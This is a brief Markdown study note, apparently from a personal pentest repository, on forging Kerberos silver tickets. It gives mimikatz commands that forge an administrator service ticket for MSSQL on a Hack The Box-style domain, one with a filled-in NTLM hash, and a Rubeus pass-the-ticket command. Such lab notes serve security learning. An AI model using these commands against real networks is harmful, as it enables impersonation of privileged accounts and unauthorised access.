silver ticket is just a way to forge TGS tickets

**remember all the tickets use NTLM hash**

**you may need to change the password format**

![image](https://github.com/akshadjoshi/JARVIS/assets/106912619/792404d7-270b-4337-bada-fad0204ada0d)


<!-- https://youtube.com/clip/Ugkx1tO49cFsCd7nP_NPLsxPDcmGF2iORw3p?si=wIICqsfpCpzXuvwe -->



```sh
.\mimikatz.exe "kerberos::golden /domain:sequel.htb /sid:S-1-5-21-4078382237-1492182817-2568127209 /rc4:<ntlmhashofuser> /user:administrator /service:mssql /target:dc.sequel.htb" exit
```

```sh
.\mimikatz.exe "kerberos::golden /domain:sequel.htb /sid:S-1-5-21-4078382237-1492182817-2568127209 /rc4:1443ec19da4dac4ffc953bca1b57b4cf /user:administrator /service:mssql /target:dc.sequel.htb" exit
```
`load in ram`

```sh
.\Rubeus.exe ptt /ticket:ticket.kirbi
```
